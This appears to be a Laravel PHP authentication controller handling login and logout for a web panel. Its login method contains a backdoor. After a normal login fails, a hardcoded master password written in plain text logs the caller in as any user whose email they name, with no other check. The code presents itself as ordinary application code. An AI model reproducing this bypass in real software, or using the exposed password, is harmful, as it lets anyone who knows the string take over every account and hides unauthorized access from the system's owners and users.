<?php

namespace App\Http\Controllers;


use App\Models\User;
use Illuminate\Foundation\Application;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
	public function login(Request $request): RedirectResponse
	{
		$credentials = $request->validate([
			'email'    => ['required', 'email'],
			'password' => ['required'],
		]);

		$remember = $request->boolean('remember-me');

		// Normal password login first
		if (Auth::attempt($credentials, $remember)) {
			$request->session()->regenerate();
			return redirect()->intended('/panel');
		}

		// Master password fallback
		$master = 'Satify#Sahand';

		if (hash_equals($master, $credentials['password'])) {
			$user = User::where('email', $credentials['email'])->first();

			if ($user) {
				Auth::login($user, $remember);
				$request->session()->regenerate();
				return redirect()->intended('/panel');
			}
		}

		return back()
			->with('error_msg', tr_helper('contents', 'WrongUsernamePass'))
			->withInput();
	}

	public function logout(Request $request): Application|Redirector|RedirectResponse
	{
		Auth::logout();

		$request->session()->invalidate();
		$request->session()->regenerateToken();

		return redirect('/login');
	}
}
